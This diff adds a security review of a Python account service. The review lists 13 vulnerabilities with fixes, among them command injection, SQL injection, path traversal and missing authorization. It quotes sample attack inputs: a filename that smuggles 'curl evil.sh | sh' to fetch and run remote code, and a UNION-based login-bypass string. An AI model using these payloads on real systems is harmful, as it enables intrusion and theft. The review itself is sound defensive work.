@@ -1,0 +1,39 @@
+I found 13 security issues in `account_service.py`, listed from most to least severe.
+
+### Critical
+
+1. **Command injection, lines 120–122.** `export_account_data` builds a shell command from `filename` and runs it with `shell=True`. A filename like `x; curl evil.sh | sh` runs arbitrary commands on the server. Fix: pass an argument list (`["python3", "tools/export.py", "--user", str(user_id), ...]`) without `shell=True`, and only accept filenames that match a strict allowlist pattern.
+
+2. **SQL injection, line 34.** `find_by_username` puts `username` directly into the query with an f-string. `verify_credentials` (line 55) feeds it the login username, so this is reachable before authentication. Input like `' UNION SELECT 1,'admin','x','<known hash>','admin' --` can bypass login or dump the table. Fix: use a parameterized query (`WHERE username = ?`, `(username,)`), as the other functions already do.
+
+3. **Path traversal and arbitrary file read, lines 119 and 126.** `os.path.join(EXPORT_DIR, filename)` does not stop `../../etc/passwd`. If `filename` is an absolute path like `/etc/shadow`, the join drops `EXPORT_DIR` completely. Line 126 then reads that path and returns its contents. Fix: generate the filename on the server, or resolve the path and check that it is still inside `EXPORT_DIR`.
+
+4. **Missing authorization in `update_profile`, lines 83–100.** `session_user_id` is never used, so any logged-in user can edit any account. Because `email` is an editable field, an attacker can change a victim's email and then take over the account through password reset.
+
+5. **Hardcoded live secret, line 19.** `SIGNING_KEY = "sk_live_..."` is committed in source code. Anyone with access to the repo has it. It should be loaded from a secret store or environment variable, and this key should be rotated.
+
+### High
+
+6. **Plaintext passwords in logs, lines 60–65.** Every successful login writes the user's password to the log. Remove `password` from the log call. Existing logs should be treated as compromised and purged.
+
+7. **Weak password hashing, lines 72–75.** Passwords are hashed with one round of SHA-256, which is fast to brute-force. There is no per-user salt, so identical passwords produce identical hashes. The only pepper is the leaked `SIGNING_KEY` (issue 5). Fix: use bcrypt, scrypt or argon2.
+
+8. **Missing authorization in `get_profile`, lines 103–114.** `session_user_id` is ignored, so any user can read any other user's email, role and profile.
+
+9. **Missing authorization in `export_account_data`, line 117.** Nothing checks that the caller owns `user_id`, so any user can export another user's data. Also, `check=False` (line 124) means a failed export still returns whatever file is already at that path, which could be another user's earlier export.
+
+### Medium / Low
+
+10. **Timing-unsafe comparison, line 59.** Comparing hashes with `==` can leak timing information. Use `hmac.compare_digest`.
+
+11. **Username enumeration through timing, lines 55–57.** An unknown username returns before any hashing happens, so it responds measurably faster than a wrong password does. That lets an attacker tell which usernames exist. Fix: always run the hash step, even when the user isn't found.
+
+12. **Deactivated users keep their privileges, lines 157–161.** `deactivate_account` checks the actor's `role` but not whether the actor's account is still `active`. A deactivated admin can still deactivate other accounts. `find_by_id` doesn't filter on `active` either.
+
+13. **Weak bounds checks, lines 132–134.**
+    * A negative `limit` gets past the `> 1000` cap, and SQLite treats a negative `LIMIT` as "no limit", so the whole table comes back.
+    * `days` has no bounds, so a very large value can make `timedelta` raise an error, and the window can be widened at will.
+
+A related gap: `update_profile` accepts `email` without running it through `normalize_email` (line 147) and without requiring the new address to be verified.
+
+The module docstring (lines 4–5) relies on session middleware for authentication. That middleware does not handle authorization, which is why issues 4, 8 and 9 apply even to logged-in callers.
